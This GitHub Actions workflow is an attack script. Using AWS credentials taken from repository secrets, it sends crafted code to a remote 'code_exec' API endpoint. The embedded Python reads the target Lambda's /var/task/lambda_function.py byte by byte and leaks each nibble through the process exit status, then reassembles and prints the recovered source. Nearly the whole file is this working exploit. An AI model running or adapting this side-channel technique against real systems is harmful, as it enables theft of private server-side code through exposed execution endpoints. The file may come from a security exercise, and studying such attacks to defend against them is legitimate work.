name: Stage2-CodeExec-Source-Read

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  contents: read

jobs:
  source:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1

    steps:
      - name: Extract code_exec source
        shell: bash
        run: |
          set +e

          python3 -m pip install requests requests-aws4auth boto3 --quiet

          python3 - <<'PY'
          import base64
          import re
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth

          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
          MAX_BYTES = 512

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          def read_nibble(index, shift):
              code = (
                  "p='/var/task/lambda_function.py'; "
                  "d=open(p,'rb').read(); "
                  "b=d[" + str(index) + "] if " + str(index) + "<len(d) else 0; "
                  "raise SystemExit(20+((b>>" + str(shift) + ")&15))"
              )

              encoded = base64.b64encode(code.encode()).decode()

              response = requests.post(
                  API,
                  json={"code": encoded},
                  auth=auth,
                  timeout=20
              )

              match = re.search(
                  r"exit status:?\s*(\d+)",
                  response.text
              )

              if not match:
                  return None

              return int(match.group(1)) - 20

          recovered = bytearray()

          for index in range(MAX_BYTES):
              low = read_nibble(index, 0)
              high = read_nibble(index, 4)

              if low is None or high is None:
                  print("STOP_INDEX=" + str(index))
                  break

              value = (high << 4) | low

              if value == 0:
                  print("STOP_INDEX=" + str(index))
                  break

              recovered.append(value)

              print(
                  "INDEX=%d BYTE=%d CHAR=%r"
                  % (index, value, chr(value)),
                  flush=True
              )

          print("SOURCE_TEXT_BEGIN")
          print(recovered.decode("utf-8", errors="replace"))
          print("SOURCE_TEXT_END")
          PY
